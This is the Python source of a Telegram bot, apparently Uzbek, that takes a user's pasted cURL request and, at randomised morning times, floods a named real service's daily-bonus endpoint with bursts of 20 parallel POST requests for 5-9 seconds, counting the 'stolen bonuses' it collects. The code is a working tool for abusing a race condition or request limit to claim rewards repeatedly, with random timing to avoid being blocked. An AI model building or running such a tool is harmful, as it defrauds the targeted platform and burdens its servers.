from flask import Flask
import threading
import telebot
from telebot import types
import requests
import time
import os
import re
import json
import random
from datetime import datetime, timedelta
import concurrent.futures

# Render sozlamalari
BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask('')

@app.route('/')
def home():
    return "Bot Avto-Burst rejimida yoniq!"

def run_web():
    app.run(host='0.0.0.0', port=8080)

users_data = {}
lock = threading.Lock()

def get_tashkent_time():
    """O'zbekiston vaqtini olish (UTC+5)"""
    return datetime.utcnow() + timedelta(hours=5)

def set_next_random_time(user):
    """06:07 dan 11:50 gacha bo'lgan vaqt oralig'ida tasodifiy vaqt belgilash"""
    # 06:07 = 367 daqiqa, 11:50 = 710 daqiqa
    random_minutes = random.randint(367, 710)
    now = get_tashkent_time()
    target = now.replace(hour=random_minutes // 60, minute=random_minutes % 60, second=0, microsecond=0)
    
    if now >= target:
        target += timedelta(days=1)
    
    user["target_time"] = target
    return target

def burst_attack(chat_id, duration):
    """Portlovchi hujum: berilgan soniya davomida parallel so'rovlar yuboradi"""
    user = users_data.get(chat_id)
    if not user: return

    session = requests.Session()
    start_time = time.time()
    success_count = 0
    
    def send_req():
        nonlocal success_count
        try:
            resp = session.post(user["url"], headers=user["headers"], json=user["data"], timeout=5)
            if resp.status_code == 200:
                success_count += 1
        except:
            pass

    # Belgilangan 5-9 soniya davomida sikl aylanadi
    while time.time() - start_time < duration:
        if not user.get("auto_mode") and not user.get("is_running"):
            break
            
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(send_req) for _ in range(20)]
            concurrent.futures.wait(futures)
        
        time.sleep(0.1) # Kichik tanaffus (bloklanib qolmaslik uchun)

    bot.send_message(chat_id, f"✅ Avto-hujum yakunlandi!\n⏱ Davomiyligi: {duration} sek.\n💰 Yulib olingan bonuslar: {success_count} ta.")

def auto_worker(chat_id):
    """Orqa fonda vaqtni poylab turuvchi funksiya"""
    user = users_data.get(chat_id)
    while user and user.get("auto_mode"):
        now = get_tashkent_time()
        target = user.get("target_time")

        if target and now >= target:
            # 5 va 9 soniya oralig'ida tasodifiy davomiylik
            random_duration = random.randint(5, 9)
            burst_attack(chat_id, random_duration)
            
            # Keyingi kun uchun yangi vaqt belgilash
            set_next_random_time(user)
            bot.send_message(chat_id, f"🔄 Keyingi avto-hujum vaqti: {user['target_time'].strftime('%H:%M')} ga belgilandi.")
        
        time.sleep(30) # Har 30 soniyada soatni tekshirish

def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton("🚀 Portlovchi Hujum (Qo'lda)")
    btn2 = types.KeyboardButton("🤖 Avto-rejimni yoqish")
    btn3 = types.KeyboardButton("🛑 To'xtatish")
    btn4 = types.KeyboardButton("⚙️ Sozlamalar")
    markup.add(btn1, btn2, btn3, btn4)
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "👋 Bonus Ovchisi V3 (Smart Auto)!\ncURL yuboring va Avto-rejimni yoqing.", reply_markup=get_main_menu())

@bot.message_handler(func=lambda message: message.text.startswith("curl "))
def handle_curl(message):
    # Oldingi parse_curl kodi (URLni https://aladdin.1it.uz/v3/daily/appoint ga majburlaydi)
    try:
        headers = {}
        header_matches = re.findall(r"-H\s+'([^:]+):\s*([^']+)'", message.text)
        for k, v in header_matches: headers[k.strip()] = v.strip()
        data_match = re.search(r"--data-raw\s+'([^']+)'", message.text)
        data = json.loads(data_match.group(1)) if data_match else None
        
        users_data[message.chat.id] = {
            "url": "https://aladdin.1it.uz/v3/daily/appoint",
            "headers": headers,
            "data": data,
            "is_running": False,
            "auto_mode": False
        }
        bot.reply_to(message, "✅ cURL qabul qilindi!")
    except:
        bot.reply_to(message, "❌ cURL xato.")

@bot.message_handler(func=lambda message: message.text == "🤖 Avto-rejimni yoqish")
def toggle_auto(message):
    chat_id = message.chat.id
    user = users_data.get(chat_id)
    if not user:
        bot.send_message(chat_id, "Oldin cURL yuboring!")
        return
    
    user["auto_mode"] = True
    next_time = set_next_random_time(user)
    threading.Thread(target=auto_worker, args=(chat_id,), daemon=True).start()
    bot.send_message(chat_id, f"🤖 Avto-rejim YOQILDI!\nIlk urinish: {next_time.strftime('%H:%M')}\nDavomiyligi: 5-9 sek (random)")

@bot.message_handler(func=lambda message: message.text == "🛑 To'xtatish")
def stop_all(message):
    user = users_data.get(message.chat.id)
    if user:
        user["auto_mode"] = False
        user["is_running"] = False
    bot.send_message(message.chat.id, "🛑 Barcha jarayonlar to'xtatildi.")

if __name__ == "__main__":
    threading.Thread(target=run_web, daemon=True).start()
    bot.polling(none_stop=True)
